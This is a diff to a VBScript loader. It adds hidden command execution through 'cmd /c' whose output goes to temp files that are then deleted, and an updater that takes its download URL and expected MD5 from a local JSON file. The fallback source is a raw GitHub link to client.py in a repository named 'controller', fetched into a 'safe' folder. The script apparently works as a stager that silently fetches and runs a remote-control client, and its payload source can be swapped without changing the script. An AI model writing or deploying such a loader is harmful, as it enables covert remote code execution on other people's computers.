@@ -63,12 +63,22 @@ Sub Log(s)
   lf.Close
 End Sub
 Function ExecOut(cmd)
-  Dim p: Set p = sh.Exec(cmd)
-  Dim o: o = ""
-  Do While Not p.StdOut.AtEndOfStream
-    o = o & p.StdOut.ReadLine() & vbCrLf
-  Loop
-  ExecOut = o
+  On Error Resume Next
+  Dim tmp, rc, out
+  Randomize
+  tmp = logDir & "\out_" & Replace(Replace(Replace(CStr(Now), ":", "_"), " ", "_"), "/", "_") & "_" & CStr(Int(Rnd * 1000000)) & ".txt"
+  If LCase(Left(cmd, 7)) = "cmd /c " Then
+    rc = sh.Run(cmd & " > """ & tmp & """ 2>&1", 0, True)
+  Else
+    rc = sh.Run("cmd /c " & cmd & " > """ & tmp & """ 2>&1", 0, True)
+  End If
+  out = ReadText(tmp)
+  If fso.FileExists(tmp) Then
+    On Error Resume Next
+    fso.DeleteFile tmp, True
+    On Error GoTo 0
+  End If
+  ExecOut = out
 End Function
 Function FindPythonw()
   On Error Resume Next
@@ -104,6 +114,44 @@ Function FileMD5(path)
     End If
   Next
   FileMD5 = LCase(h)
+End Function
+Function ReadText(path)
+  On Error Resume Next
+  If Not fso.FileExists(path) Then ReadText = "" : Exit Function
+  Dim t: t = ""
+  Dim f: Set f = fso.OpenTextFile(path, 1, False)
+  t = f.ReadAll
+  f.Close
+  ReadText = t
+End Function
+Function ExtractJsonValue(json, key)
+  On Error Resume Next
+  Dim k: k = """" & key & """"
+  Dim p: p = InStr(1, json, k, vbTextCompare)
+  If p = 0 Then ExtractJsonValue = "" : Exit Function
+  p = InStr(p, json, ":")
+  If p = 0 Then ExtractJsonValue = "" : Exit Function
+  p = InStr(p, json, """")
+  If p = 0 Then ExtractJsonValue = "" : Exit Function
+  Dim q: q = InStr(p + 1, json, """")
+  If q = 0 Then ExtractJsonValue = "" : Exit Function
+  ExtractJsonValue = Mid(json, p + 1, q - p - 1)
+End Function
+Function UpdaterMD5()
+  On Error Resume Next
+  Dim p: p = scriptDir & "\updates\updater_state.json"
+  Dim j: j = ReadText(p)
+  Dim v: v = ExtractJsonValue(j, "md5")
+  If v = "" Then v = EXPECTED_MD5
+  UpdaterMD5 = LCase(v)
+End Function
+Function UpdaterURL()
+  On Error Resume Next
+  Dim p: p = scriptDir & "\updates\updater_state.json"
+  Dim j: j = ReadText(p)
+  Dim u: u = ExtractJsonValue(j, "download_url")
+  If u = "" Then u = "https://raw.githubusercontent.com/Bryllebanquil/controller/main/client.py"
+  UpdaterURL = u
 End Function
 Function DownloadToFile(url, path)
   On Error Resume Next
@@ -146,7 +194,6 @@ Function PythonAvailable()
 End Function
 Sub EnsurePython()
   If PythonAvailable() Then Exit Sub
-  If PythonAvailable() Then Exit Sub
   If Not IsOnline() Then
     Log "Offline detected; deferring Python install"
     Exit Sub
@@ -165,26 +212,42 @@ Sub EnsurePython()
   If Not PythonAvailable() Then Log "Python install failed"
 End Sub
 Function FindClientPy()
-  Dim p1: p1 = scriptDir & "\client.py"
-  If fso.FileExists(p1) Then FindClientPy = p1 : Exit Function
-  Dim p2: p2 = safeDir & "\client.py"
-  If fso.FileExists(p2) Then FindClientPy = p2 : Exit Function
-  Dim url: url = "https://raw.githubusercontent.com/Bryllebanquil/controller/main/client.py"
+  Dim pScript: pScript = scriptDir & "\client.py"
+  Dim pSafe: pSafe = safeDir & "\client.py"
+  Dim expected: expected = UpdaterMD5()
+  Dim url: url = UpdaterURL()
+  If fso.FileExists(pSafe) Then
+    Dim cur: cur = FileMD5(pSafe)
+    If cur = expected And cur <> "" Then
+      FindClientPy = pSafe
+      Exit Function
+    End If
+  End If
+  If fso.FileExists(pScript) Then
+    Dim m: m = FileMD5(pScript)
+    If m = expected And m <> "" Then
+      On Error Resume Next
+      fso.CopyFile pScript, pSafe, True
+      On Error GoTo 0
+      FindClientPy = pSafe
+      Exit Function
+    End If
+  End If
   If Not IsOnline() Then
     Log "Offline detected; deferring client.py download"
     FindClientPy = ""
     Exit Function
   End If
-  If DownloadToFile(url, p2) Then
-    Dim md5: md5 = FileMD5(p2)
-    If md5 = EXPECTED_MD5 Then
-      FindClientPy = p2
+  If DownloadToFile(url, pSafe) Then
+    Dim md: md = FileMD5(pSafe)
+    If md = expected And md <> "" Then
+      FindClientPy = pSafe
       Exit Function
     Else
       On Error Resume Next
-      fso.DeleteFile p2, True
+      fso.DeleteFile pSafe, True
       On Error GoTo 0
-      Log "MD5 mismatch: " & md5
+      Log "MD5 mismatch: " & md
     End If
   Else
     Log "client.py download failed"
